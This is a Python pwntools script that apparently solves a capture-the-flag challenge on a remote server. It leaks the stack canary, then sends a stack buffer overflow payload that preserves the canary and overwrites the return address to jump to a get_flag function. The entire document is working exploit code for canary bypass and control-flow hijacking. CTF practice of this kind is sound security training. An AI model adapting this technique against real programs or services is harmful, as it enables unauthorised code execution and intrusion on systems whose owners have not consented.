from pwn import *

conn = remote('ctf21.softwaresecurity.no', 7002)
print(conn.recvline())

send = b'16'
conn.sendline(send)

#print(f"Send #1 {send}")
fetc = conn.recv(1024)

bfore = b'a' * 16 + p64(0x00007fffffffdec0)  # 8 * 3

canari = p64(int(fetc))

after = p64(0x0)

get_flag = p64(0x4007f7)

#print(f"#2 {bfore, canari, after, get_flag}")
conn.sendline(bfore + canari + after + get_flag)
# conn.send()
print(conn.recv(1024))
